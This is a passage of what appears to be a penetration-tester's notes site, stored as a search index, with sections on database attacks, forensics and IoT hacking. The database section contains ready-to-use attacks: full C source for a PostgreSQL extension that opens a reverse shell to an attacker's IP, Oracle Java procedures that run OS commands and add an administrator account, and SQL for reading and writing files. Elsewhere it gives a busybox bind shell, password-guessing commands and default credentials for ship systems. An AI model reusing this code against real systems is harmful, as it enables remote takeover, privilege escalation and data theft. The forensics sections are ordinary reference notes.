SELECT ENCODE ( CONVERT_TO ( field , UTF-8 ), base64 ) FROM table ; Bypass Avoid quotes: SELECT CHR ( 65 ) || CHR ( 65 ) || CHR ( 65 ) || CHR ( 65 ); = SELECT AAAA ; = SELECT $$ AAAA$$ ; == SELECT $ TAG$AAAA$TAG$ ; https://www.postgresql.org/docs/9.4/functions-string.html https://www.postgresql.org/docs/9.4/sql-syntax-lexical.html File access Read: COPY table_name from file_name Read file using SQLI CREATE temp table test ( content text ); COPY test from $$ c : \\ test . txt$$ ; SELECT content from test ; DROP table test ; Write: Cannot handle multiple lines COPY table_name to file_name COPY ( select $$ example$$ ) to file_name COPY ( select convert_from ( decode ($$ ENCODED_PAYLOAD $$,$$ base64 $$),$$ utf-8 $$)) to $$ C : \\\\ example . exe $$; Load extension: CREATE OR REPLACE FUNCTION test ( text , integer ) RETURNS void AS FILENAME , test LANGUAGE C STRICT ; CREATE OR REPLACE FUNCTION test ( text , integer ) RETURNS void AS $$\\\\ 192 . 168 . 1 . 2 \\ test \\ test . dll$$ , test LANGUAGE C STRICT ; c :\\ Program Files ( x86 ) \\ PostgreSQL \\ 9 . 2 \\ include \\ server \\ port \\ win32_msvc ;c:\\Program Files (x86)\\PostgreSQL\\9.2\\include\\server\\port\\win32;c:\\Program Files (x86)\\PostgreSQL\\9.2\\include\\server;c:\\Program Files (x86)\\PostgreSQL\\9.2\\include;%(AdditionalIncludeDirectories) Large object https://www.postgresql.org/docs/9.2/static/largeobjects.html Read file: select lo_import ( C:\\\\Windows\\\\win.ini , 1234 ); select loid , pageno from pg_largeobject ; The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB). select loid , pageno , encode ( data , escape ) from pg_largeobject ; Write file: update pg_largeobject set data = decode ( 74657374 , hex ) where loid = 1234 and pageno = 0 ; select lo_export ( 1234 , C:\\\\new_win.ini ); List: \\ lo_list Delete: \\ lo_unlink 1234 https://github.com/sourceincite/tools/blob/master/pgpwn.c /* pgpwn.c date: 23/11/2016 Developed by: mr_me Synopsis: ========= This code creates a postgres extension that registers a connect_back() function allowing an attacker to gain a reverse shell. Motivation: =========== A zero-day that runs the postgres user as SYSTEM and whereby I could not gain rce via writing to disk without a reboot. Benefits: ========= - No touching disk... - Can be loaded from remote... Example Usage: ============== 1. Register the function: ------------------------- CREATE FUNCTION connect_back(text, integer) RETURNS void AS $$\\\\vmware-host\\Shared Folders\\research\\DemoExtension.dll$$, $$connect_back$$ LANGUAGE C STRICT; That loads the DLL from remote, via a share! ;-) 2. Execute it: -------------- SELECT connect_back( 172.16.175.1 , 1234); 3. On the attackers machine: ------------------------------ saturn:~ mr_me$ nc -lv 1234 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Program Files\\PostgreSQL\\9.2\\data whoami whoami nt authority\\network service C:\\Program Files\\PostgreSQL\\9.2\\data 4. Now, if you want to remove it, simply: ----------------------------------------- DROP FUNCTION connect_back(text, integer); References: =========== 1. http://blog.2ndquadrant.com/compiling-postgresql-extensions-visual-studio-windows/ License: ======== This code is licensed under the Creative Commons Attribution-Non\u2011Commercial 4.0 International License. */ #define _WINSOCK_DEPRECATED_NO_WARNINGS #include postgres.h #include string.h #include fmgr.h #include utils/geo_decls.h #include stdio.h #include winsock2.h #include utils/builtins.h #pragma comment(lib, ws2_32 ) #ifdef PG_MODULE_MAGIC PG_MODULE_MAGIC ; #endif /* Add a prototype marked PGDLLEXPORT */ PGDLLEXPORT Datum connect_back ( PG_FUNCTION_ARGS ); PG_FUNCTION_INFO_V1 ( connect_back ); WSADATA wsaData ; SOCKET s1 ; struct sockaddr_in hax ; char ip_addr [ 16 ]; STARTUPINFO sui ; PROCESS_INFORMATION pi ; Datum connect_back ( PG_FUNCTION_ARGS ) { /* convert C string to text pointer */ #define GET_TEXT(cstrp) \\ DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp))) /* convert text pointer to C string */ #define GET_STR(textp) \\ DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp))) WSAStartup ( MAKEWORD ( 2 , 2 ), wsaData ); s1 = WSASocket ( AF_INET , SOCK_STREAM , IPPROTO_TCP , NULL , ( unsigned int ) NULL , ( unsigned int ) NULL ); hax . sin_family = AF_INET ; hax . sin_port = htons ( PG_GETARG_INT32 ( 1 )); hax . sin_addr . s_addr = inet_addr ( GET_STR ( PG_GETARG_TEXT_P ( 0 ))); WSAConnect ( s1 , ( SOCKADDR * ) hax , sizeof ( hax ), NULL , NULL , NULL , NULL ); memset ( sui , 0 , sizeof ( sui )); sui . cb = sizeof ( sui ); sui . dwFlags = ( STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW ); sui . hStdInput = sui . hStdOutput = sui . hStdError = ( HANDLE ) s1 ; CreateProcess ( NULL , cmd.exe , NULL , NULL , TRUE , 0 , NULL , NULL , sui , pi ); PG_RETURN_VOID (); }","title":"Postgresql"},{"location":"databases/#oracle","text":"","title":"Oracle"},{"location":"databases/#rce","text":"Add permissions (sqlPlus required): DECLARE l_schema VARCHAR2 ( 30 ) : = SYSTEM ; BEGIN DBMS_JAVA . grant_permission ( l_schema , java.io.FilePermission , ALL FILES , read ,write, execute, delete ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , writeFileDescriptor , ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , readFileDescriptor , ); END ; / Java code: CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED pwn AS import java . lang . * ; import java . io . * ; public class pwn { public static void cmd ( String command ) throws IOException { Runtime . getRuntime (). exec ( command ); } } ; / Create procedure: CREATE OR REPLACE PROCEDURE pwn_cmd ( p_command IN VARCHAR2 ) AS LANGUAGE JAVA NAME pwn.cmd (java.lang.String) ; / Run command: exec pwn_cmd ( net user trevelyn trevelyn /add ); exec pwn_cmd ( net localgroup Administrators trevelyn /add ); exec pwn_cmd ( cmd.exe /c echo open X.X.X.X C:\\ftp.txt );","title":"RCE"},{"location":"databases/#tools_1","text":"Oracle Database Attack Tool (ODAT) https://github.com/quentinhardy/odat All checks : . / odat . py all - s 10 . 10 . 10 . 82 - p 1521 . / odat . py all - s 10 . 10 . 10 . 82 - d XE - U scott - P tiger Gusss SID : . / odat . py sidguesser - s 10 . 10 . 10 . 82 Guess passwords : . / odat . py passwordguesser - d XE - s 10 . 10 . 10 . 82 - p 1521 -- accounts - file / root / HTB / tools / db / odat / accounts / accounts . txt Guess login : use admin / oracle / oracle_login Upload file : . / odat . py utlfile - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- putFile c : / writeup . exe ~/ HTB / silo / writeup . exe . / odat . py dbmsxslprocessor - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- putFile c: \\\\ inetpub \\\\ wwwroot File-Test.txt /tmp/File-Test.txt Execute file : . / odat . py externaltable - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- exec c : / writeup . exe Nmap nmap --script oracle-sid-brute (TARGET IP ADDRESS) -p 1521 oscanner oscanner - s ( TARGET IP ADDRESS )","title":"Tools"},{"location":"databases/#queries","text":"Get all usernames and password: SELECT Username || : || PASSWORD AS credentials FROM DBA_USERS ; DB Version: SELECT * FROM V$VERSION List all tables owned by user: SELECT table_name FROM user_tables ; Get current DB user: SELECT NAME FROM v$database ;","title":"Queries"},{"location":"databases/#references","text":"https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573","title":"References"},{"location":"databases/#hsqldb","text":"http://hsqldb.org/doc/2.0/guide/sqlroutines-chapt.html#src_jrt_routines http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines CREATE FUNCTION getProperty ( IN key VARCHAR ) RETURNS VARCHAR LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME CLASSPATH:java.lang.System.getProperty VALUES ( getProperty ( java.class.path )) lib / rt . jar and class path for public static void \\ w + \\ ( String CREATE PROCEDURE writeBytesToFilename ( IN paramString VARCHAR , IN paramArrayOfByte VARBINARY ( 1024 )) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename call writeBytesToFilename ( example.txt , cast ( HEX AS VARBINARY ( 1024 )))","title":"HSQLDB"},{"location":"defense/","text":"Tools Incident response https://thehive-project.org/ BeaKer Record all apps making network connections Make this data searchable Combine Sysmon Winlogbeat ELK stack","title":"Defense"},{"location":"defense/#tools","text":"Incident response https://thehive-project.org/ BeaKer Record all apps making network connections Make this data searchable Combine Sysmon Winlogbeat ELK stack","title":"Tools"},{"location":"dfir/","text":"DFIR Linux Disk Deleted files Linux lost + found strings / dev / sdb sudo dcfldd if =/ dev / sdb of =/ home / pi / usb . dd testdisk / home / pi / usb . dd Temp files myfile.txt~ .myfile.txt.swp .myfile.txt.un~ .backup Windows Disk Mount: https://accessdata.com/product-download/ftk-imager-version-4.2.0 Autopsy: http://www.sleuthkit.org/autopsy/ Show attribute ID of NTFS file systems (fls) The Sleuth Kit: http://www.sleuthkit.org/sleuthkit/ NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker SIFT Beginning of partition: mmls Assemble image in raw: ewfmount /mnt/disk1 obtain shadow file information: vshadowinfo -o /mnt/disk1/ewf1 val = partition start value from mmls * 512 Mount shadow: vshadowmount -o /mnt/disk1/ewf1 /mnt/vss mount -o ro,loop /mnt/vss/vss1 /mnt/disk2 Volume serial number Position 0x48 of the BPB (Bios Parameter Block), which is part of the boot sector. $ boot - mount with FTK Imager Or use \"vol\" command https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10) https://www.digital-detective.net/documents/Volume%20Serial%20Numbers.pdf Registry C : \\ Windows \\ system32 \\ config http://www.regxplor.com/ https://ericzimmerman.github.io/#!index. RegRipper - Etracting/parsing information (keys, values, data) from the Registry and presenting it for analysis: https://github.com/keydet89/RegRipper2.8 RECmd - Command line access to the Registry: https://github.com/EricZimmerman/RECmd Timezone: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ TimeZoneInformation Computer Name: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ ComputerName Last Shutdown: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ Windows - ShutdownTime Build Number: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ NT \\ CurrentVersion \\ CurrentBuildNumber Important Registry Locations Collection: https://www.dfir.training/resources/downloads/windows-registry Important Files $ MFT Master File Table Kind of index of all files on the hard drive https://jmharkness.wordpress.com/2011/01/27/mft-file-reference-number/ All the entries of the MFT have a reference number, composed of the number of the MFT entry (6 bytes) and the sequence number (2 bytes) in hexadecimal. Ref: 0x002E00000000F1AB - MFT entry: 00000000F1AB, Sequence number: 0x002E Can be dumped with: http://malware-hunters.net/all-downloads/ MRU Most Recently Used NTUSER.dat Can be read with RegRipper with the plugin runmru . Pulling the UserAssist, which stores the latest applications, shortcuts and documents opened by the user rip . exe - p userassist - r .. / NTUSER . DAT USN Journal (Update Sequence Number Journal) Keeps a log of the changes that are made in an NTFS volume http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf Extract the log with FTK Imager parse this journal with the NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker C : \\ $ Extend \\ $ UsrJrnl , Logs: C : \\ Windows \\ system32 \\ winevt \\ logs User logins: Each time a session is started the user profile is loaded. This action leaves a record in the Microsoft - Windows - User Profile Service log / Operational . evtx Prefetch: File extensions of interest: http://www.hexacorn.com/blog/2019/02/11/file-extensions-of-interest/ Common Memory Volatility Cheatsheet: https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf volatility - f example . dmp imageinfo volatility - f example . dmp --profile Win2012R2x64 lsadump volatility - f example . dmp --profile Win2012R2x64 hivelist volatility - f example . dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000 - y is virtual address of SYSTEM hive - s is virtual address of SYSTEM hive CTFs Challenges CTFs: https://aboutdfir.com/challenges-ctfs/ Writeups DEFCON 2018 DFIR CTF - Forensic Challenge (Level 1): https://www.securityartwork.es/2019/01/04/defcon-2018-dfir-ctf-reto-forense-intro-nivel-1/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 2): https://www.securityartwork.es/2019/01/07/defcon-2018-dfir-ctf-reto-forense-nivel-2/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 3): https://www.securityartwork.es/2019/01/08/defcon-2018-dfir-ctf-reto-forense-nivel-3-conclusiones/ DEFCON DFIR CTF 2018\u200a\u2014\u200aLessons Learned: https://medium.com/@monliclican/defcon-dfir-ctf-2018-lessons-learned-890ef781b96c References Books File System Forensic Analysis: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier-ebook/dp/B000OZ0N9O New References So you want to be a Digital Forensics professional: https://www.peerlyst.com/posts/so-you-want-to-be-a-digital-forensics-professional-calvin-liu?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Cheatsheets Linux Command Line Forensics and Intrusion Detection Cheat Sheet: https://www.sandflysecurity.com/blog/compromised-linux-cheat-sheet/ \"Hunt Evil: Lateral Movement\": https://www.sans.org/security-resources/posters/dfir/hunt-evil-165?utm_medium=Social utm_source=Twitter utm_content=May+HuntEvil+Registration+Twitter_RSR utm_campaign=DFIR+Poster Windows Forensic Analysis : POSTER: https://www.sans.org/security-resources/posters/windows-forensics-evidence-of/75/download?utm_medium=Social utm_source=Twitter utm_content=June+APAC+WindowsForensics_RSR utm_campaign=DFIR+Poster Advanced Smartphone Forensics : POSTER: https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf","title":"DFIR"},{"location":"dfir/#dfir","text":"","title":"DFIR"},{"location":"dfir/#linux","text":"","title":"Linux"},{"location":"dfir/#disk","text":"","title":"Disk"},{"location":"dfir/#deleted-files","text":"Linux lost + found strings / dev / sdb sudo dcfldd if =/ dev / sdb of =/ home / pi / usb . dd testdisk / home / pi / usb . dd","title":"Deleted files"},{"location":"dfir/#temp-files","text":"myfile.txt~ .myfile.txt.swp .myfile.txt.un~ .backup","title":"Temp files"},{"location":"dfir/#windows","text":"","title":"Windows"},{"location":"dfir/#disk_1","text":"Mount: https://accessdata.com/product-download/ftk-imager-version-4.2.0 Autopsy: http://www.sleuthkit.org/autopsy/ Show attribute ID of NTFS file systems (fls) The Sleuth Kit: http://www.sleuthkit.org/sleuthkit/ NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker SIFT Beginning of partition: mmls Assemble image in raw: ewfmount /mnt/disk1 obtain shadow file information: vshadowinfo -o /mnt/disk1/ewf1 val = partition start value from mmls * 512 Mount shadow: vshadowmount -o /mnt/disk1/ewf1 /mnt/vss mount -o ro,loop /mnt/vss/vss1 /mnt/disk2 Volume serial number Position 0x48 of the BPB (Bios Parameter Block), which is part of the boot sector. $ boot - mount with FTK Imager Or use \"vol\" command https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10) https://www.digital-detective.net/documents/Volume%20Serial%20Numbers.pdf","title":"Disk"},{"location":"dfir/#registry","text":"C : \\ Windows \\ system32 \\ config http://www.regxplor.com/ https://ericzimmerman.github.io/#!index. RegRipper - Etracting/parsing information (keys, values, data) from the Registry and presenting it for analysis: https://github.com/keydet89/RegRipper2.8 RECmd - Command line access to the Registry: https://github.com/EricZimmerman/RECmd Timezone: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ TimeZoneInformation Computer Name: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ ComputerName Last Shutdown: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ Windows - ShutdownTime Build Number: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ NT \\ CurrentVersion \\ CurrentBuildNumber Important Registry Locations Collection: https://www.dfir.training/resources/downloads/windows-registry","title":"Registry"},{"location":"dfir/#important-files","text":"$ MFT Master File Table Kind of index of all files on the hard drive https://jmharkness.wordpress.com/2011/01/27/mft-file-reference-number/ All the entries of the MFT have a reference number, composed of the number of the MFT entry (6 bytes) and the sequence number (2 bytes) in hexadecimal. Ref: 0x002E00000000F1AB - MFT entry: 00000000F1AB, Sequence number: 0x002E Can be dumped with: http://malware-hunters.net/all-downloads/ MRU Most Recently Used NTUSER.dat Can be read with RegRipper with the plugin runmru . Pulling the UserAssist, which stores the latest applications, shortcuts and documents opened by the user rip . exe - p userassist - r .. / NTUSER . DAT USN Journal (Update Sequence Number Journal) Keeps a log of the changes that are made in an NTFS volume http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf Extract the log with FTK Imager parse this journal with the NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker C : \\ $ Extend \\ $ UsrJrnl , Logs: C : \\ Windows \\ system32 \\ winevt \\ logs User logins: Each time a session is started the user profile is loaded. This action leaves a record in the Microsoft - Windows - User Profile Service log / Operational . evtx Prefetch: File extensions of interest: http://www.hexacorn.com/blog/2019/02/11/file-extensions-of-interest/","title":"Important Files"},{"location":"dfir/#common","text":"","title":"Common"},{"location":"dfir/#memory","text":"Volatility Cheatsheet: https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf volatility - f example . dmp imageinfo volatility - f example . dmp --profile Win2012R2x64 lsadump volatility - f example . dmp --profile Win2012R2x64 hivelist volatility - f example . dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000 - y is virtual address of SYSTEM hive - s is virtual address of SYSTEM hive","title":"Memory"},{"location":"dfir/#ctfs","text":"Challenges CTFs: https://aboutdfir.com/challenges-ctfs/","title":"CTFs"},{"location":"dfir/#writeups","text":"DEFCON 2018 DFIR CTF - Forensic Challenge (Level 1): https://www.securityartwork.es/2019/01/04/defcon-2018-dfir-ctf-reto-forense-intro-nivel-1/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 2): https://www.securityartwork.es/2019/01/07/defcon-2018-dfir-ctf-reto-forense-nivel-2/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 3): https://www.securityartwork.es/2019/01/08/defcon-2018-dfir-ctf-reto-forense-nivel-3-conclusiones/ DEFCON DFIR CTF 2018\u200a\u2014\u200aLessons Learned: https://medium.com/@monliclican/defcon-dfir-ctf-2018-lessons-learned-890ef781b96c","title":"Writeups"},{"location":"dfir/#references","text":"","title":"References"},{"location":"dfir/#books","text":"File System Forensic Analysis: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier-ebook/dp/B000OZ0N9O","title":"Books"},{"location":"dfir/#new-references","text":"So you want to be a Digital Forensics professional: https://www.peerlyst.com/posts/so-you-want-to-be-a-digital-forensics-professional-calvin-liu?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post","title":"New References"},{"location":"dfir/#cheatsheets","text":"Linux Command Line Forensics and Intrusion Detection Cheat Sheet: https://www.sandflysecurity.com/blog/compromised-linux-cheat-sheet/ \"Hunt Evil: Lateral Movement\": https://www.sans.org/security-resources/posters/dfir/hunt-evil-165?utm_medium=Social utm_source=Twitter utm_content=May+HuntEvil+Registration+Twitter_RSR utm_campaign=DFIR+Poster Windows Forensic Analysis : POSTER: https://www.sans.org/security-resources/posters/windows-forensics-evidence-of/75/download?utm_medium=Social utm_source=Twitter utm_content=June+APAC+WindowsForensics_RSR utm_campaign=DFIR+Poster Advanced Smartphone Forensics : POSTER: https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf","title":"Cheatsheets"},{"location":"embedded-and-iot/","text":"Lab Setup RPi as poor man's hardware hacking tool: https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool/ https://systemoverlord.com/static/attachments/iot_toolkit.pdf OSH Stencils: https://www.oshstencils.com Quick Reference Cross Compiling - Compile for MIPS: mips - linux - gnu - gcc bindshell . c - o bindshell - static mips - linux - gnu - strip bindshell ESP Read Flash: esptool . py - p / dev / ttyUSB0 - b 460800 read_flash 0 0 x200000 flash . bin Check Device config: espefuse . py --port /dev/ttyUSB0 summary Binwalk Display information: binwalk - t - vvv example - firmware Extract: binwalk - e - t - vvv example - firmware Entropy Analysis (identity compression / encryption): binwalk - E example - firmware http://www.devttys0.com/2013/06/differentiate-encryption-from-compression-using-math/ Repacking Firmware https://github.com/rampageX/firmware-mod-kit/wiki . / extract - firmware . sh example - firmware . bin . / build - formware . sh Busybox Command Injection: https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/ Bind a telnet shell to port 9999: / bin / busybox telnetd - l / bin / sh - p9999 QMUE Run binaries inside a firmware whereis qemu - mips - static cp / etc / example / qemu - mips - static squashfs - root # From squashfs - root chroot . / . / qemu - mips - static bin / ls Test Scenarios Replaying of sensor communication Pair device with controlling application without authorization Using guessable identifiers for linking WiFi and other credentials stored in flash Techniques Glitching Voltage glitching attacks: https://twitter.com/d_olex/status/1084700474043813895 Side Channel Intel TLBleed: https://www.theregister.co.uk/2018/06/22/intel_tlbleed_key_data_leak/ Collections Searchable FCC ID Database: https://fccid.io/ Command to download all FCC ID documents: https://rehmann.co/blog/command-download-fcc-id-documents/ for i in $ ( seq 3 4200000 ) ; do curl \u2013referer \u2018https://apps.fcc.gov/oetcf/eas/reports/ViewExhibitReport.cfm\u2019 \u2018https://apps.fcc.gov/eas/GetApplicationAttachment.html?calledFromFrame=Y id=\u2019$i -o $i; done Protocols UART / Serial All clock speeds are set independently of the signal baud rate is the rate at which bits will be transmitted (bits per second). There is one start bit. There is one stop bit (a low voltage cycle). 8 data bits in the middle. 1 parity bit at the end of the data. Settings Number of data bits/number of parity bits/number of stop bits 8/N/1 (8N1) means 8 data bits, No parity bit, and 1 stop bit Common Baud Rates 9600 19200 38400 57600 115200 Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware UART to Root [Pending]: https://exfil.co/2019/02/14/uart-to-root-the-harder-way/ SPI MISO - Master In Slave Out - Data flow from the slave units to the master unit MOSI - Master Out Slave In - Data flow from the master unit to the slave units SCLK - The clock signal pin - Rising edge of the clock triggers the level of MISO/MOSI to be read as the current bit by the target device. SS / CS - Slave / Chip Select - Select a device, this pin is grounded, telling the particular device to listen up. VCC / GND Typical https://en.wikipedia.org/wiki/Chip_select Daisy Chained The SPI port of each slave is designed to send out during the second group of clock pulses an exact copy of the data it received during the first group of clock pulses. The whole chain acts as a communication shift register. Daisy chaining is often done with shift registers to provide a bank of inputs or outputs through SPI. Each slave copies input to output in the next clock cycle until active low SS line goes high. SPI mode - is the combination of CPOL and CPHA CPOL - Polarity of the clock CPOL=0 is a clock which idles at 0 - Leading edge is a rising edge - Trailing edge is a falling edge CPOL=1 is a clock which idles at 1 - Leading edge is a falling edge - Trailing edge is a rising edge CPHA - Timing of the data bits relative to the clock pulses CPHA=0 - \"out\" side changes the data on the trailing edge of the preceding clock cycle, while the \"in\" side captures the data on (or shortly after) the leading edge of the clock cycle - First bit must be on the MOSI line before the leading clock edge CPHA=1 - \"out\" side changes the data on the leading edge of the current clock cycle, while the \"in\" side captures the data on (or shortly after) the trailing edge of the clock cycle - For the last cycle, the slave holds the MISO line valid until slave select is deasserted. https://en.wikipedia.org/wiki/Serial_Peripheral_Interface I2C JTAG TDI - Test Data In TDO - Test Data Out - When you daisychain IC\u2019s with JTAG, the TDO of one goes to the TDI of the next, until it loops back to the debug header. TCK - Test Clock - JTAG clock signal, the rising edge triggering a read operation. TCK is not chained, but rather forms a \u2019test clock bus\u2019 along with TMS each IC can see the clock and TMS signals. TMS - Test Mode Select - Read as the clock signal rises, and determines the next state of the internal JTAG controller TRST - Test Reset - An optional pin that can reset the internal test controller, but this isn\u2019t required. Test Access Port (TAP) Controller to handle JTAG commands Minimally 3 registers (instruction register, 2 or more data registers) State-machine that uses the TMS level to decide what to do after each clock cycle TAP controller connects to the boundary cells Boundary Cells can raise/lower a leg\u2019s voltage to influence the behavior of the chip Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware SWD Tools Glasgow = Bus Pirate + Bus Blaster + Logic Sniffer https://github.com/whitequark/Glasgow https://twitter.com/whitequark/status/985040607864176640 https://twitter.com/marcan42/status/1090564121068593153 Cutdown version of starshipraider: https://github.com/azonenberg/starshipraider OpenWRT USB Storage: https://openwrt.org/docs/guide-user/storage/usb-drives https://openwrt.org/docs/guide-user/additional-software/extroot_configuration https://wiki.openwrt.org/doc/howto/usb.storage https://wiki.openwrt.org/doc/howto/extroot FACT - The Firmware Analysis and Comparison Tool: https://fkie-cad.github.io/FACT_core/ Platform Firmware Auditing Tool: https://github.com/PreOS-Security/fwaudit BIOS - https://github.com/chipsec/chipsec Specific Jammers Open Source ESP8266 Based Laser Jammer: https://github.com/hevnsnt/NOTCHACOTCHA WiFI / Wireless SecKC ESP8266 Captive Portal and Hacking Challenge: https://github.com/hevnsnt/cotcha ATMs References: ATM LOGIC ATTACKS: SCENARIOS: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/ATM-Vulnerabilities-2018-eng.pdf Automobile Tools: canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1 References: Automobile Hacking, Part 1: The CAN Protocol: https://www.hackers-arise.com/single-post/2017/08/04/Automobile-Hacking-Part-1-The-CAN-Protocol Automobile Hacking, Part 2: The can-utils or SocketCAN: https://www.hackers-arise.com/single-post/2017/08/08/Automobile-Hacking-Part-2-The-can-utils-or-SocketCAN Automobile Hacking, Part 3: Metasploit for Car Hacking: https://www.hackers-arise.com/single-post/2017/10/19/Automobile-Hacking-Part-3-Metasploit-for-Car-Hacking Automobile Hacking, Part 4: How to Hack the Keyless Entry System: https://www.hackers-arise.com/single-post/2018/12/05/Automobile-Hacking-Part-4-How-to-Hack-the-Keyless-Entry-System Awesome Vehicle Security: https://github.com/jaredthecoder/awesome-vehicle-security https://twitter.com/0xcharlie/status/1014892446495305733 Bluetooth References: A Bluetooth low energy capture the flag: https://github.com/hackgnar/ble_ctf My notes on Hacking BLE \u2013 list of resources: https://www.davidsopas.com/my-notes-on-hacking-ble-list-of-resources/ Cameras Tools: Pentax Hacker Development Kit: https://github.com/i-am-shodan/PHDK https://www.dropbox.com/s/ogez7sb4b0cw92g/hacking_pentax_k30.pdf Canon Hack Development Kit: http://chdk.wikia.com/wiki/CHDK Locks **References: ** How to open a Tapplock over BLE in under two seconds: https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/ Printers Discovery: Windows SharpPrinter - Discover Printers: https://github.com/rvrsh3ll/SharpPrinter ListNetworks - Enumerate all visible network printers in local network: https://github.com/vinifr/-ListNetworks Linux Praeda - Automated printer data harvesting tool: http://h.foofus.net/?page_id=218 Exploitation: PRET - Printer Exploitation Toolkit: https://github.com/RUB-NDS/PRET praedasploit - https://github.com/MooseDojo/praedasploit Attack Patterns: Plunder Pillage Print: https://hackinparis.com/data/slides/2014/DeralHeilandandPeterArzamendi.pdf LDAP/SMB/SMTP Pass-Back-Attack: http://foofus.net/goons/percx/praeda/pass-back-attack.pdf LDAP - power address book functionality SMB - saving scans to file shares SMTP - scan to email Export configuration and look for credentials LDAP traffic is unencrypted (usually), can MITM Guides: An Introduction to Printer Exploitation: https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565 Ships Shodan Searches: org:\"Inmarsat Solutions US\" Login for Globe wireless title:\"sailor 900\" Sat antenna details Exploit: https://www.exploit-db.com/exploits/35932 Default credentials: admin/1234 html:commbox KVH CommBox terminals Vessel name / network structure leaked \"Show Users\" link (or can request the content by appending /rest.php?action=QCgetActiveUsers) **Tools: ** Vuln Ship Tracker: https://ptp-shiptracker.herokuapp.com/ Terms: ECDIS are the electronic chart systems that are needed to navigate. AIS transceiver - system that ships use to avoid colliding with each other. NMEA 0183 messages Ethernet and serial networks are often \u2018bridged\u2019 at several points (GPS,satcom terminal, ECDIS) OT systems are used to control the steering gear, engines, ballast pumps and lots more. They communicate using NMEA 0183 messages. No message authentication, encryption or validation (only 2 byte XOR checksum) Attack Patterns: Spoof the ECDIS using the vulnerable config interface, 'grow' the ship and 'jump' it in to the shipping lanes. Other ships AIS will alert the ships captain to a collision scenario MitM and change NMEA 0183 messages to read differently Ex: change the rudder command by modifying a GPS autopilot command References: Summarized References: https://www.pentestpartners.com/security-blog/osint-from-ship-satcoms/ https://www.pentestpartners.com/security-blog/hacking-tracking-stealing-and-sinking-ships/ UEFI References: UEFI_EXPLOITATION_MASSES_FINAL: https://github.com/eclypsium/Publications/blob/master/2018/DEFCON26/DC26_UEFI_EXPLOITATION_MASSES_FINAL.pdf Tools: EDK II Project - A modern, feature-rich, cross-platform firmware development environment for the UEFI and PI specifications from www.uefi.org : https://github.com/tianocore/edk2 RaspberryPiPkg - 64-bit Tiano Core UEFI for the Raspberry Pi 3 (with devices, Linux, NetBSD, FreeBSD and Windows on Arm!): https://github.com/andreiw/RaspberryPiPkg uefi-firmware-parser - Parse BIOS/Intel ME/UEFI firmware related structures: Volumes, FileSystems, Files, etc: https://github.com/theopolis/uefi-firmware-parser CTFs and Practice Capture the Signal! https://www.trendmicro.com/cts/ References New References Twinkly Twinkly Little Star: https://labs.mwrinfosecurity.com/blog/twinkly-twinkly-little-star search for Xiaomi scooters lock unlock the devices: https://github.com/rani-i/Mi365Locker Mass play any YouTube video, terminate apps and rename Chromecast device(s) obtained from Shodan.io: 